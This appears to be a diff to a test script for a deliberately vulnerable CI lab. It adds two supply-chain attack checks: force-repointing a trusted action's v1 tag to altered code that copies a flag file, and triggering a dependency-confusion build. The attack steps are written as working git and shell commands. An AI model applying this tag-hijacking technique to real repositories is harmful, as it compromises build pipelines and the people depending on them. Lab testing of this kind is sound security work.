@@ -457,6 +457,50 @@ EOF
   else no pbac_2 "no leaked token on runner"; fi
 fi
 
+echo "### Supply-chain kill-chains ###"
+
+# --- sup_1: re-point the tag the pipeline trusts -> malicious action runs on next CI run ----
+if enabled sup_1; then
+  on runner 'rm -f /tmp/sup1-proof' >/dev/null 2>&1
+  W=$(mktemp -d)
+  git clone -q "http://$AU:$AP@gitea:3000/marketplace/deploy-action.git" "$W/sa" 2>/dev/null
+  cat > "$W/sa/action.yml" <<'YML'
+name: deploy-helper
+description: shared composite action
+runs:
+  using: composite
+  steps:
+    - run: cat /opt/minilab2/sup1-flag.txt > /tmp/sup1-proof
+      shell: bash
+YML
+  ( cd "$W/sa"; git -c user.email=atk@x -c user.name=atk add -A
+    git -c user.email=atk@x -c user.name=atk commit -q -m "v1.0.1"
+    git -c user.email=atk@x -c user.name=atk branch -f v1
+    git -c user.email=atk@x -c user.name=atk push -q origin main
+    git -c user.email=atk@x -c user.name=atk push -f -q origin v1 ) 2>/dev/null
+  rm -rf "$W"
+  # trigger alpha/app CI (which pins the action @v1, now malicious)
+  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
+  ( cd "$W/app"; date > .sup1-trig; git -c user.email=atk@x -c user.name=atk add -A
+    git -c user.email=atk@x -c user.name=atk commit -q -m trigger
+    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
+  rm -rf "$W"
+  out=$(on runner 'for i in $(seq 1 60); do [ -s /tmp/sup1-proof ] && break; sleep 3; done; cat /tmp/sup1-proof 2>/dev/null')
+  chk sup_1 sup_1-action-retag "$out"
+fi
+
+# --- sup_4: dependency confusion — CI pulls the attacker's higher version off the mirror ----
+if enabled sup_4; then
+  on runner 'rm -f /tmp/sup4-proof' >/dev/null 2>&1
+  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
+  ( cd "$W/app"; date > .sup4-trig; git -c user.email=atk@x -c user.name=atk add -A
+    git -c user.email=atk@x -c user.name=atk commit -q -m trigger
+    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
+  rm -rf "$W"
+  out=$(on runner 'for i in $(seq 1 70); do [ -s /tmp/sup4-proof ] && break; sleep 3; done; cat /tmp/sup4-proof 2>/dev/null')
+  chk sup_4 sup_4-dependency-confusion "$out"
+fi
+
 echo
 printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
 [ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
